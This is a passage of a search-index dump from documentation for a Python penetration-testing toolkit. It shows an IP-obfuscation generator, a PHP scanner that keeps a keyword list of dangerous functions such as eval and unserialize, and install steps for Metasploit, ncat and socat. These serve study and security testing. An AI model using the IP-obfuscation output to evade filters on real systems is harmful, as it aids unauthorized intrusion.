print unicode values and associated information to stdout.       About: About Page     Changlog: Version Control Changelog     "},{"id":13,"href":"/commands/ip_urls/","title":"ip_urls.py","parent":"Commands","content":" Generate a list of obfuscated ip variations and print to stdout.\n Screencast     Help  usage: ip_urls.py [-h] ip Generate a list of obfuscated ip variations and print to stdout. positional arguments: ip ip address optional arguments: -h, --help show this help message and exit   Source  #!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34;Generate a list of obfuscated ip variations and print to stdout.\u0026#34;\u0026#34;\u0026#34; from v0tools.ips import get_urls from v0tools.lib.log import get_log from v0tools.cli import Cli, exceptions import ipaddress LOG = get_log() cli = Cli() cli.parser.add_argument( \u0026#34;ip\u0026#34;, help=\u0026#34;ip address\u0026#34;, type=str, ) def main(args): \u0026#34;\u0026#34;\u0026#34;Run main function.\u0026#34;\u0026#34;\u0026#34; LOG.info(f\u0026#34;Showing IP Variations for {args.ip}\u0026#34;) try: ok = ipaddress.ip_address(args.ip) except ValueError: ok = None if not ok: raise exceptions.InvalidIp(args.ip) get_urls(args.ip) cli.set_entrypoint(main) if __name__ == \u0026#34;__main__\u0026#34;: # args = cli.get_parse(\u0026#34;--help\u0026#34;) # args = cli.get_parse(\u0026#34;172.217.5.110\u0026#34;) # args = cli.get_parse(\u0026#34;172.217.5\u0026#34;) args = cli.get_parse() cli.run(args)    "},{"id":14,"href":"/commands/php_search_vuln/","title":"php_search_vuln.py","parent":"Commands","content":" Search for vulnerable calls / strings in php code.\nExample Repo: https://github.com/OWASP/Vulnerable-Web-Application.git\n Screencast     Help  usage: php_search_vuln.py [-h] [--filter FILTER] [--inc_lines INC_LINES] path Search for vulnerable calls / strings in php code. Example Repo: https://github.com/OWASP/Vulnerable-Web-Application.git positional arguments: path Directory or file path. optional arguments: -h, --help show this help message and exit --filter FILTER, -f FILTER i.e. *.php or *.py --inc_lines INC_LINES, -l INC_LINES number of lines to include before / after match   Source  #!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34;Search for vulnerable calls / strings in php code. Example Repo: https://github.com/OWASP/Vulnerable-Web-Application.git \u0026#34;\u0026#34;\u0026#34; from v0tools import exceptions from v0tools.ansi import green, red, magenta from v0tools.lib.filesystem import iterfiles from v0tools.cli import Cli VULN_STRINGS = { # str: url (if applicable) # \u0026#34;${\u0026#34;: None, b\u0026#34;eval\u0026#34;: None, b\u0026#34;assert\u0026#34;: None, b\u0026#34;preg_replace\u0026#34;: None, b\u0026#34;create_function\u0026#34;: None, b\u0026#34;include\u0026#34;: None, b\u0026#34;require\u0026#34;: None, b\u0026#34;ReflectionFunction\u0026#34;: None, b\u0026#34;invoke\u0026#34;: None, b\u0026#34;serialize\u0026#34;: b\u0026#34;https://book.hacktricks.xyz/pentesting-web/deserialization#php\u0026#34;, } cli = Cli() parser = cli.parser cli.add_path() parser.add_argument( \u0026#34;--filter\u0026#34;, \u0026#34;-f\u0026#34;, help=\u0026#34;i.e. *.php or *.py\u0026#34;, default=\u0026#34;*.php\u0026#34;, type=str, ) parser.add_argument( \u0026#34;--inc_lines\u0026#34;, \u0026#34;-l\u0026#34;, help=\u0026#34;number of lines to include before / after match\u0026#34;, type=int, default=3, ) def _check_vuln(filename, args): with open(filename, \u0026#34;rb\u0026#34;) as fileh: lines = list(fileh.readlines()) for idx, line in enumerate(lines): for cstr, url in VULN_STRINGS.items(): if cstr in line: retlines = lines[idx - args.inc_lines : idx + args.inc_lines] yield idx, retlines, cstr, url def main(args): \u0026#34;\u0026#34;\u0026#34;Run main function.\u0026#34;\u0026#34;\u0026#34; files = [] fcnt = 0 for filename in iterfiles(args.path, args.filter): fcnt += 1 for idx, lines, cstr, url in _check_vuln(filename, args): url = green(url) if url else \u0026#34;\u0026#34; title = magenta(f\u0026#34;\\n{filename} : {idx} {url}\\n\u0026#34;) print(title) output = b\u0026#34;\u0026#34;.join(lines).replace(cstr, red(cstr.decode()).encode()) for line in output.splitlines(): print(f\u0026#34; {line.decode()}\u0026#34;) files.append([idx, filename]) if fcnt == 0: raise exceptions.NoAction( \u0026#34;No files were scanned, maybe try adjusting the filter?\u0026#34; ) if not files: raise exceptions.NoAction(f\u0026#34;Could not find any vulns in dir {args.path}\u0026#34;) print(\u0026#34;\\n\\n\u0026#34;) vimcmd = [\u0026#34;vim\u0026#34;] + [f\u0026#39;-c \u0026#34;tabnew +{ln + 1} {fn}\u0026#34;\u0026#39; for ln, fn in files] print(magenta(\u0026#34; \u0026#34;.join(vimcmd))) cli.set_entrypoint(main) if __name__ == \u0026#34;__main__\u0026#34;: args = cli.get_parse() # args = cli.get_parse(\u0026#34;--help\u0026#34;) # args = cli.get_parse(\u0026#34;~/repos/Vulnerable-Web-Application -f \u0026#39;*.php\u0026#39; -l 3\u0026#34;) cli.run(args)    "},{"id":15,"href":"/sys_prerequisites/fedora/","title":"RHEL/CentOS/Fedora","parent":"System Install","content":"# Python / Package Pre-reqs sudo yum -y install python3-pip python3-devel gcc git # Provides fzf, konsole, socat, rlwrap, ffmpeg, nc, msfvenom, msfconsole, screenkey sudo yum -y install konsole socat nmap-ncat screenkey # Install fzf git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf ~/.fzf/install source ~/.bashrc # Install rlwrap sudo yum -y group install \u0026#34;Development Tools\u0026#34; sudo yum -y install readline-devel git clone https://github.com/hanslub42/rlwrap.git cd rlwrap autoreconf --install ./configure make sudo make install # Install ffmpeg sudo yum -y install epel-release sudo yum -y localinstall --nogpgcheck https://download1.rpmfusion.org/free/el/rpmfusion-free-release-7.noarch.rpm sudo yum -y install ffmpeg ffmpeg-devel # Install msfvenom curl https://apt.metasploit.com/metasploit-framework.gpg.key \u0026gt; /tmp/msf.asc rpm --import /tmp/msf.asc sudo yum -y install yum-utils sudo yum-config-manager --add-repo=https://rpm.metasploit.com/ sudo yum -y install metasploit-framework.x86_64 # install pip package pip3 install v0tools "},{"id":16,"href":"/sys_prerequisites/debian/","title":"Ubuntu / Debian based OS's","parent":"System Install","content":"# Python / Package Pre-reqs sudo apt install python3-pip # Provides fzf, konsole, socat, rlwrap, ffmpeg, nc, msfvenom, msfconsole, screenkey sudo apt install fzf konsole socat rlwrap ffmpeg ncat screenkey # Install msfvenom curl https://apt.metasploit.com/metasploit-framework.gpg.key | apt-key add - echo deb http://apt.metasploit.com buster main \u0026gt;\u0026gt; /etc/apt/sources.list apt update apt install -y metasploit-framework # install pip package pip3 install v0tools "},{"id":17,"href":"/commands/unicodes/","title":"unicodes.py","parent":"Commands","content":" print unicode values and associated information to stdout.\n Screencast     Help  usage: unicodes.py [-h] [-f [FILTER [FILTER ...]]] print unicode values and associated information to stdout. example: unicodes.py | fzf optional arguments: -h, --help show this help message and exit -f [FILTER [FILTER ...]], --filter [FILTER [FILTER ...]] Filter string   Source  #!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34;print unicode values and associated information to stdout.\u0026#34;\u0026#34;\u0026#34; from v0tools import chars, cli import os dstring = f\u0026#34;\u0026#34;\u0026#34; {__doc__} example: {os.path.basename(__file__)} | fzf \u0026#34;\u0026#34;\u0026#34; cli = cli.Cli(dstring) parser = cli.parser parser.add_argument( \u0026#34;-f\u0026#34;, \u0026#34;--filter\u0026#34;, nargs=\u0026#34;*\u0026#34;, help=\u0026#34;Filter string\u0026#34;, action=\u0026#34;append\u0026#34;, type=str, required=False, default=None, ) def main(args): \u0026#34;\u0026#34;\u0026#34;Run main function.\u0026#34;\u0026#34;\u0026#34; if args.filter: fvalues = [i[0] for i in args.filter] else: fvalues = [] for _, i in enumerate(chars.unicodes()): _int, _hex, _chr, name, uval, htmlent = i.values() line = f\u0026#34;{_chr} {name} int:{_int} hex:{_hex.zfill(2)} {uval} {htmlent}\u0026#34; if not fvalues: print(line, flush=True) continue if all([i in line for i in fvalues]): print(line, flush=True) cli.set_entrypoint(main) if __name__ == \u0026#34;__main__\u0026#34;: args = cli.get_parse() # args = cli.get_parse([\u0026#34;-f\u0026#34;, \u0026#34;cat\u0026#34;, \u0026#34;-f\u0026#34;, \u0026#34;grin\u0026#34;]) cli.run(args) # args = cli.get_parse(\u0026#34;--help\u0026#34;)    "},{"id":18,"href":"/about/","title":"About","parent":"Home","content":"  Theme About Me   Theme Hugo Theme: https://geekdocs.de\nAbout Me SRE by day, security wonk by night Feel free to reach out on the Hack the box discord , DM:stev0\n"},{"id":19,"href":"/changelog/","title":"Changlog","parent":"Home","content":" TOC ...   v0.0.3 v0.0.2 v0.0.1     v0.0.3 Updated badges\n 2021-09-08 14:32 UTC HEAD)\n Updated documentation\n 2021-09-08 00:29 UTC 6d6e3cd)\n Updated changelog\n 2021-09-07 19:42 UTC c54526d)\n  v0.0.2 Updated page to generate badges / changelog / about page\n 2021-09-07 19:36 UTC 03a9d9b)\n Updated gitignore and added LICENSE to root of main site\n 2021-09-07 18:34 UTC 16bea02)\n  v0.0.1 Initial release\n 2021-09-07 18:03 UTC 40cf72e)\n  "},{"id":20,"href":"/tags/","title":"Tags","parent":"Home","content":""}]